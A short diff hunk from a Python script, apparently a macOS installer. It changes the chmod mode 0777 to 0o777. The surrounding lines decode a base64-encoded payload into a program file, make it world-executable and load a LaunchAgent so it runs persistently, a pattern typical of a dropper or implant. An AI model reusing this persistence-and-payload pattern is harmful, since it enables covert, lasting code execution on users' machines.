@@ -79,7 +79,7 @@ with open(get_launch_agent_file(), "w") as output_file:
 with open(get_program_file(), "w") as output_file:
     output_file.write(base64.b64decode(PAYLOAD_BASE64))
 
-os.chmod(get_program_file(), 0777)
+os.chmod(get_program_file(), 0o777)
 
 # Load the launch agent
 output = run_command("launchctl load -w " + get_launch_agent_file())
